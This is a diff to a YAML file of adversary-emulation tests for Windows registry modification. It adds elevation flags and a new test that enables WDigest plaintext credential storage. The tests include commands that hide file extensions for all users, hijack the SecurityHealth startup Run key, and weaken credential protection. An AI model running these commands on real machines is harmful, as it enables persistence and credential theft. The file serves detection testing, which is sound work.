@@ -10,9 +10,10 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
       reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
-      
+
 - name: Modify Registry of Local Machine - cmd
   description: |
     Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
@@ -21,6 +22,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
 
@@ -31,11 +33,12 @@ atomic_tests:
     - windows
   executor:
     name: powershell
+    elevation_required: true
     command: |
       # here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.
       # Here we can load all unloaded user hives and do whatever we want in the location below (comments)
       $PatternSID = 'S-1-5-21-\d+-\d+\-\d+\-\d+$'
-      
+
       Write-Verbose -Message 'Gathering Profile List and loading their registry hives'
       # Get Username, SID, and location of ntuser.dat for all users
 
@@ -44,12 +47,12 @@ atomic_tests:
         Select  @{ name = "SID"; expression = { $_.PSChildName } },
                 @{ name = "UserHive"; expression = { "$($_.ProfileImagePath)\ntuser.dat" } },
                 @{ name = "Username"; expression = { $_.ProfileImagePath -replace '^(.*[\\\/])', '' } }
-        
+
       # Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)
       $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = "SID"; expression = { $_.PSChildName } }
-            
+
       $SIDObject = @()
-        
+
       foreach ($item in $LoadedHives)
       {
           $props = @{
@@ -75,11 +78,25 @@ atomic_tests:
                   Write-Verbose -Message 'Attempting to modify registry keys for each profile'
                   #####################################################################
                   reg add "HKEY_CURRENT_USER\$($ProfileList[$p].SID)\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v HideFileExt /d 1 /f
+              }
           }
       }
 
       Write-Verbose 'Unloading Registry hives for all users'
-      # Unload ntuser.dat        
+      # Unload ntuser.dat
       ### Garbage collection and closing of ntuser.dat ###
       [gc]::Collect()
       reg unload "HKU\$($ProfileList[$p].SID)"
+
+- name: Modify registry for password downgrade to plain text
+  description: |
+    Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping) 
+  supported_platforms:
+    - windows
+  executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+      cleanup_command: |
+        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
